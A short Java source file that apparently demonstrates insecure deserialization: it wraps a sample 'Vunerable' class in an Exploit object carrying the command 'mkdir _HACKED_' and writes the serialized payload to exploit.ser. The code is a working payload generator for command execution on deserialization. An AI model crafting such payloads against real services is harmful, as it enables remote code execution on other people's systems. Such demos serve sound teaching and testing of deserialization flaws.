package com.ttulka.security;

import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

import com.ttulka.security.sample.Vunerable;

public class ExploitExternal extends Exploit {

    public ExploitExternal(String cmd) {
        super(cmd);
    }

    public static void main(String[] args) throws Exception {
        Vunerable vunerable = new Vunerable();
        vunerable.setObject(new Object());
        vunerable.setProperty("ignored");

        Vunerable exploited = new Exploit("mkdir _HACKED_")
                .exploited(vunerable);

        try (OutputStream fos = Files.newOutputStream(Paths.get("exploit.ser"));
             ObjectOutputStream oos = new ObjectOutputStream(fos)) {

            oos.writeObject(exploited);
            oos.flush();
        }
    }
}
